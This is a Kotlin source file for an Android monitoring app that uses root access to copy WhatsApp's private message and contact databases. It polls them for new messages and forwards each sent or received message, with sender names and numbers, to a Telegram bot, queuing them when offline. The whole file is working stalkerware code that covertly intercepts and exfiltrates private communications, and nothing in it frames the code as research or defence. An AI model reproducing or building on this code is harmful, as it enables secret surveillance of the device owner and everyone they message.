package com.system.superiormonitor.monitor

import com.system.superiormonitor.util.LogLevel

import android.content.Context
import android.content.pm.PackageManager
import android.database.sqlite.SQLiteDatabase
import com.system.superiormonitor.util.LogCategory
import com.system.superiormonitor.util.LogManager
import com.topjohnwu.superuser.Shell
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.*
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.system.superiormonitor.bot.TelegramApi

/**
 * Native Kotlin port of the Python WhatsApp database monitor (sql2.py).
 *
 * Architecture:
 *   stat-polling shell → Flow → debounce(1500ms) → sync DB → query → format → Telegram
 *
 * Lifecycle is strictly tied to the parent coroutine scope (BotService).
 * When stop() is called or the scope is cancelled, the root watcher process is killed.
 */
class WhatsAppMonitor(
    private val context: Context,
    private val sendTelegram: (String, String?) -> Unit
) {
    companion object {
        private const val TAG = "WhatsAppMonitor"
        private const val WA_PACKAGE = "com.whatsapp"
        private const val DEFAULT_WA_DB_DIR = "/data/data/$WA_PACKAGE/databases"
        private const val DEBOUNCE_MS = 1500L
        private const val POLL_INTERVAL = "0.3"

        /**
         * Dynamically resolves WhatsApp's database directory via root.
         * Tries multiple strategies to handle OEM path differences.
         * Returns the resolved path, or the default fallback.
         */
        fun resolveWhatsAppDbDir(): String {
            // Strategy 1: Use dumpsys to find the actual dataDir
            try {
                val result = Shell.cmd("dumpsys package $WA_PACKAGE | grep 'dataDir='").exec()
                if (result.isSuccess) {
                    val dataDir = result.out
                        .firstOrNull { it.contains("dataDir=") }
                        ?.trim()
                        ?.substringAfter("dataDir=")
                        ?.trim()
                    if (!dataDir.isNullOrBlank()) {
                        val dbDir = "$dataDir/databases"
                        val check = Shell.cmd("ls $dbDir/msgstore.db 2>/dev/null").exec()
                        if (check.isSuccess && check.out.isNotEmpty()) {
                            return dbDir
                        }
                    }
                }
            } catch (_: Exception) { }

            // Strategy 2: Check common alternative paths
            val alternativePaths = listOf(
                "/data/user/0/$WA_PACKAGE/databases",
                "/data/data/$WA_PACKAGE/databases"
            )
            for (path in alternativePaths) {
                try {
                    val check = Shell.cmd("ls $path/msgstore.db 2>/dev/null").exec()
                    if (check.isSuccess && check.out.isNotEmpty()) {
                        return path
                    }
                } catch (_: Exception) { }
            }

            // Fallback: return default
            return DEFAULT_WA_DB_DIR
        }

        /**
         * Checks if WhatsApp is installed on the device using root shell
         * to bypass Android 11+ package visibility restrictions.
         */
        fun isWhatsAppInstalled(context: Context): Boolean {
            return try {
                val result = Shell.cmd("pm path $WA_PACKAGE").exec()
                result.isSuccess && result.out.any { it.contains("package:") }
            } catch (e: Exception) {
                // Fallback to PackageManager
                try {
                    context.packageManager.getPackageInfo(WA_PACKAGE, 0)
                    true
                } catch (e2: Exception) {
                    false
                }
            }
        }

        /**
         * Checks if WhatsApp database files exist (requires root).
         * Uses dynamic path resolution.
         * Returns a pair: (available: Boolean, reason: String)
         */
        fun checkWhatsAppDatabase(): Pair<Boolean, String> {
            return try {
                val dbDir = resolveWhatsAppDbDir()
                val result = Shell.cmd("ls $dbDir/msgstore.db 2>/dev/null").exec()
                if (result.isSuccess && result.out.isNotEmpty()) {
                    Pair(true, "Database found at $dbDir")
                } else {
                    Pair(false, "WhatsApp database files were not found. WhatsApp may not have been opened yet, or the data directory is inaccessible.")
                }
            } catch (e: Exception) {
                Pair(false, "Unable to verify WhatsApp database: ${e.message}")
            }
        }

        // Modern schema with jid_map (LID resolution)
        const val MODERN_QUERY = """
            SELECT
                m._id, m.timestamp, m.from_me, m.text_data,
                COALESCE(mapped_cj.raw_string, cj.raw_string) AS chat_jid,
                COALESCE(mapped_sj.raw_string, sj.raw_string) AS sender_jid
            FROM message m
            JOIN chat c ON m.chat_row_id = c._id
            JOIN jid cj ON c.jid_row_id = cj._id
            LEFT JOIN jid_map cjm ON cj._id = cjm.lid_row_id
            LEFT JOIN jid mapped_cj ON cjm.jid_row_id = mapped_cj._id
            LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
            LEFT JOIN jid_map sjm ON sj._id = sjm.lid_row_id
            LEFT JOIN jid mapped_sj ON sjm.jid_row_id = mapped_sj._id
            WHERE m._id > ? AND m.message_type NOT IN (7, 15)
            ORDER BY m._id ASC
        """

        // Legacy schema without jid_map table
        const val LEGACY_QUERY = """
            SELECT
                m._id, m.timestamp, m.from_me, m.text_data,
                cj.raw_string AS chat_jid,
                sj.raw_string AS sender_jid
            FROM message m
            JOIN chat c ON m.chat_row_id = c._id
            JOIN jid cj ON c.jid_row_id = cj._id
            LEFT JOIN jid sj ON m.sender_jid_row_id = sj._id
            WHERE m._id > ? AND m.message_type NOT IN (7, 15)
            ORDER BY m._id ASC
        """
    }

    private val workDir: File by lazy {
        val dir = context.getExternalFilesDir("whatsapp/watchdir")
            ?: File(context.cacheDir, "whatsapp/watchdir")
        dir.also { if (!it.exists()) it.mkdirs() }
    }

    private var contactsMap: Map<String, String> = emptyMap()
    private val prefsManager by lazy { com.system.superiormonitor.data.PrefsManager.getInstance(context) }
    private var watcherJob: Job? = null
    private var waDbDir: String = DEFAULT_WA_DB_DIR  // Resolved dynamically on start()

    // ═══════════════════════════════════════════════════════════
    //  PUBLIC API
    // ═══════════════════════════════════════════════════════════

    fun start(scope: CoroutineScope) {
        if (watcherJob?.isActive == true) return // Prevent double start

        watcherJob = scope.launch(Dispatchers.IO) {
            try {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Starting WhatsApp monitor...")

                // 0. Fail-safe: Check if WhatsApp is installed
                if (!isWhatsAppInstalled(context)) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] WhatsApp is not installed on this device. Monitor aborted.")
                    return@launch
                }

                // 0b. Fail-safe: Check if database files are accessible
                val (dbAvailable, dbReason) = checkWhatsAppDatabase()
                if (!dbAvailable) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] $dbReason. Monitor aborted.")
                    return@launch
                }

                // 0c. Resolve the actual database path for this device
                waDbDir = resolveWhatsAppDbDir()
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resolved WhatsApp DB path: $waDbDir")

                // 1. Load contacts once at startup
                if (contactsMap.isEmpty()) {
                    contactsMap = loadContacts()
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Loaded ${contactsMap.size} contacts into memory.")
                }

                // 2. Establish or Catch-up baseline
                syncDatabase()
                val currentMaxId = getMaxMessageId()
                
                // Sanity check: If the stored ID is greater than the DB's max ID, WhatsApp data was cleared/wiped.
                if (prefsManager.whatsappLastProcessedId > currentMaxId) {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Database wipe detected (Stored: ${prefsManager.whatsappLastProcessedId}, Current Max: $currentMaxId). Resetting baseline.")
                    prefsManager.whatsappLastProcessedId = currentMaxId
                }

                if (prefsManager.whatsappLastProcessedId == 0L) {
                    prefsManager.whatsappLastProcessedId = currentMaxId
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Baseline established (ID: ${prefsManager.whatsappLastProcessedId}). Watching for live messages...")
                } else {
                    LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Resuming from ID: ${prefsManager.whatsappLastProcessedId}. Performing catch-up sync...")
                    processNewMessages()
                }

                // 3. Start the watcher flow
                createWatcherFlow()
                    .debounce(DEBOUNCE_MS)
                    .collect {
                        try {
                            processNewMessages()
                        } catch (e: CancellationException) {
                            throw e
                        } catch (e: Exception) {
                            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error processing messages: ${e.message}", LogLevel.ERROR)
                        }
                    }
            } catch (e: CancellationException) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Monitor cancelled.")
            } catch (e: Exception) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Fatal error: ${e.message}", LogLevel.ERROR)
            }
        }
    }

    fun stop() {
        watcherJob?.cancel()
        watcherJob = null
        LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Monitor stopped.")
    }

    // ═══════════════════════════════════════════════════════════
    //  WATCHER — stat-polling shell via libsu
    //  Ports: start_smart_watcher() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun createWatcherFlow(): Flow<Unit> = flow {
        val walPath = "$waDbDir/msgstore.db-wal"

        LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Starting native Kotlin stat polling every ${POLL_INTERVAL}s.")

        // Initial baseline
        var lastStat = Shell.cmd("stat -c '%Y' $walPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()

        while (currentCoroutineContext().isActive) {
            val currentStat = Shell.cmd("stat -c '%Y' $walPath 2>/dev/null || echo 0").exec().out.joinToString("").trim()

            if (currentStat.isNotEmpty() && currentStat != "0" && currentStat != lastStat) {
                lastStat = currentStat
                emit(Unit)
            }

            delay((POLL_INTERVAL.toDouble() * 1000).toLong())
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  DATABASE SYNC — Root copy + SHM deletion
    //  Ports: sync_db() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun syncDatabase() {
        val destPath = workDir.absolutePath

        val result = Shell.cmd(
            "cp $waDbDir/msgstore.db $destPath/msgstore.db",
            "cp $waDbDir/msgstore.db-wal $destPath/msgstore.db-wal 2>/dev/null || true",
            "cp $waDbDir/msgstore.db-shm $destPath/msgstore.db-shm 2>/dev/null || true",
            "chmod 666 $destPath/msgstore.db $destPath/msgstore.db-wal $destPath/msgstore.db-shm 2>/dev/null || true"
        ).exec()

        if (!result.isSuccess) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] DB sync failed: ${result.err.joinToString()}", LogLevel.ERROR)
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  CONTACT LOADER
    //  Ports: load_contacts() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun loadContacts(): Map<String, String> {
        val contacts = mutableMapOf<String, String>()
        val destPath = workDir.absolutePath

        try {
            val copyResult = Shell.cmd(
                "cp $waDbDir/wa.db $destPath/wa.db 2>/dev/null || cp $waDbDir/../databases/wa.db $destPath/wa.db 2>/dev/null || cp /data/data/$WA_PACKAGE/databases/wa.db $destPath/wa.db",
                "chmod 666 $destPath/wa.db"
            ).exec()

            if (!copyResult.isSuccess) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Warning: Could not copy wa.db for contacts.")
                return contacts
            }

            val waDbFile = File(workDir, "wa.db")
            if (!waDbFile.exists()) return contacts

            val db = SQLiteDatabase.openDatabase(
                waDbFile.absolutePath,
                null,
                SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
            )

            db.use { database ->
                val cursor = database.rawQuery(
                    "SELECT jid, display_name, wa_name FROM wa_contacts", null
                )
                cursor.use { c ->
                    while (c.moveToNext()) {
                        val jid = c.getString(0) ?: continue
                        val name = c.getString(1) ?: c.getString(2) ?: continue
                        if (jid.isNotBlank() && name.isNotBlank()) {
                            contacts[jid] = name
                        }
                    }
                }
            }

            waDbFile.delete()
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error: Could not load contacts. (${e.message})", LogLevel.ERROR)
        }

        return contacts
    }

    // ═══════════════════════════════════════════════════════════
    //  JID PARSER
    //  Ports: parse_jid() from Python PoC exactly
    // ═══════════════════════════════════════════════════════════

    data class ParsedJid(val name: String, val number: String?, val chatType: String)

    private fun parseJid(rawJid: String?): ParsedJid {
        if (rawJid.isNullOrBlank()) return ParsedJid("Unknown", null, "Unknown")

        val parts = rawJid.split("@", limit = 2)
        val rawId = parts[0]
        val domain = if (parts.size > 1) parts[1] else ""

        // STRIP multi-device suffixes: regex split at ':' or '.'
        val cleanId = rawId.split(Regex("[:\\.]"))[0]
        val baseJid = "$cleanId@$domain"

        val knownName = contactsMap[baseJid] ?: contactsMap[rawJid]

        return when (domain) {
            "g.us" -> ParsedJid(
                name = knownName ?: "Unnamed Group",
                number = null,
                chatType = "Group"
            )
            "lid" -> ParsedJid(
                name = knownName ?: "Hidden Contact",
                number = "LID: $cleanId",
                chatType = "Community / Hidden"
            )
            "broadcast" -> ParsedJid(
                name = "Status / Broadcast",
                number = null,
                chatType = "Broadcast"
            )
            else -> ParsedJid(
                name = knownName ?: "Unsaved Number",
                number = "+$cleanId",
                chatType = "Direct Message"
            )
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  TIME FORMATTER
    //  Ports: format_time_12hr() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private val timeFormatter = SimpleDateFormat("hh:mm:ss a | dd/MM/yyyy", Locale.US)

    private fun formatTime12Hr(timestamp: Long?): String {
        if (timestamp == null || timestamp == 0L) return "Unknown Time"
        // WhatsApp stores timestamps in milliseconds
        val ts = if (timestamp > 1_000_000_000_000L) timestamp else timestamp * 1000L
        return timeFormatter.format(Date(ts))
    }

    // ═══════════════════════════════════════════════════════════
    //  MAX MESSAGE ID
    //  Ports: max_message_id() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun getMaxMessageId(): Long {
        val dbFile = File(workDir, "msgstore.db")
        if (!dbFile.exists()) return 0

        return try {
            val db = SQLiteDatabase.openDatabase(
                dbFile.absolutePath, null,
                SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
            )
            db.use { database ->
                val cursor = database.rawQuery("SELECT COALESCE(MAX(_id), 0) FROM message", null)
                cursor.use { c ->
                    if (c.moveToFirst()) c.getLong(0) else 0L
                }
            }
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Error reading max ID: ${e.message}", LogLevel.ERROR)
            0L
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  MAIN PROCESSING PIPELINE
    //  Ports: print_new_rows() from Python PoC
    // ═══════════════════════════════════════════════════════════

    private suspend fun processNewMessages() {
        // Let the SQLite WAL file finish its micro-writes (matches Python's time.sleep(0.15))
        Thread.sleep(150)

        syncDatabase()

        val dbFile = File(workDir, "msgstore.db")
        if (!dbFile.exists()) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] msgstore.db not found after sync.", LogLevel.ERROR)
            return
        }

        val db = SQLiteDatabase.openDatabase(
            dbFile.absolutePath, null,
            SQLiteDatabase.OPEN_READONLY or SQLiteDatabase.NO_LOCALIZED_COLLATORS
        )

        db.use { database ->
            val rows = queryNewMessages(database)

            for (row in rows) {
                if (row.id > prefsManager.whatsappLastProcessedId) {
                    val formatted = formatOutputMessage(row)
                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
                        context = context,
                        message = formatted,
                        offlineSubdir = "whatsapp_alrt",
                        offlineFileName = "offline_whatsapp.txt",
                        sender = sendTelegram
                    )
                    prefsManager.whatsappLastProcessedId = row.id
                }
            }

            if (rows.isNotEmpty()) {
                LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Forwarded ${rows.size} new message(s).")
            }
        }
    }

    // ═══════════════════════════════════════════════════════════
    //  SQL QUERIES — Modern (jid_map) + Legacy fallback
    // ═══════════════════════════════════════════════════════════

    private data class MessageRow(
        val id: Long,
        val timestamp: Long,
        val fromMe: Int,
        val textData: String?,
        val chatJid: String?,
        val senderJid: String?
    )

    private fun queryNewMessages(db: SQLiteDatabase): List<MessageRow> {
        // Try modern query with jid_map joins first
        try {
            return executeQuery(db, MODERN_QUERY)
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Modern query failed, falling back to legacy. (${e.message})")
        }

        // Fallback: older schema without jid_map
        try {
            return executeQuery(db, LEGACY_QUERY)
        } catch (e: Exception) {
            LogManager.log(LogCategory.SOCIAL_UPDATE, "[$TAG] Legacy query also failed: ${e.message}", LogLevel.ERROR)
        }

        return emptyList()
    }

    private fun executeQuery(db: SQLiteDatabase, query: String): List<MessageRow> {
        val rows = mutableListOf<MessageRow>()
        val cursor = db.rawQuery(query, arrayOf(prefsManager.whatsappLastProcessedId.toString()))

        cursor.use { c ->
            while (c.moveToNext()) {
                rows.add(
                    MessageRow(
                        id = c.getLong(c.getColumnIndexOrThrow("_id")),
                        timestamp = c.getLong(c.getColumnIndexOrThrow("timestamp")),
                        fromMe = c.getInt(c.getColumnIndexOrThrow("from_me")),
                        textData = c.getString(c.getColumnIndexOrThrow("text_data")),
                        chatJid = c.getString(c.getColumnIndexOrThrow("chat_jid")),
                        senderJid = c.getString(c.getColumnIndexOrThrow("sender_jid"))
                    )
                )
            }
        }

        return rows
    }

    // ═══════════════════════════════════════════════════════════
    //  OUTPUT FORMATTER
    //  Ports: the exact markdown structure from Python PoC
    // ═══════════════════════════════════════════════════════════

    private fun formatOutputMessage(row: MessageRow): String {
        val direction = if (row.fromMe == 1) "Sent" else "Received"
        val msg = if (row.textData.isNullOrBlank()) "[Non-text message / Media]" else row.textData
        val timeFormatted = formatTime12Hr(row.timestamp)

        val chatParsed = parseJid(row.chatJid)

        val sentBy: String
        val toTarget: String

        if (row.fromMe == 1) {
            sentBy = "Me"
            toTarget = if (chatParsed.chatType == "Direct Message") {
                chatParsed.number ?: chatParsed.name
            } else {
                chatParsed.name
            }
        } else {
            val actualSenderJid = if (!row.senderJid.isNullOrBlank()) row.senderJid else row.chatJid
            val senderParsed = parseJid(actualSenderJid)

            sentBy = if (chatParsed.chatType == "Direct Message" && senderParsed.name == "Unsaved Number") {
                senderParsed.number ?: senderParsed.name
            } else {
                if (senderParsed.number != null) "${senderParsed.name} (${senderParsed.number})" else senderParsed.name
            }
            toTarget = "Me"
        }

        val safeChatName = TelegramApi.escapeMarkdown(chatParsed.name)
        val safeChatType = TelegramApi.escapeMarkdown(chatParsed.chatType)
        val safeSentBy = TelegramApi.escapeMarkdown(sentBy)
        val safeToTarget = TelegramApi.escapeMarkdown(toTarget)
        val safeMsg = TelegramApi.escapeMarkdown(msg)

        // Exact markdown structure from Python PoC
        return com.system.superiormonitor.bot.BotMessages.Alerts.buildWhatsAppMessage(
            safeChatName, safeChatType, direction, timeFormatted, safeSentBy, safeToTarget, safeMsg
        )
    }
}

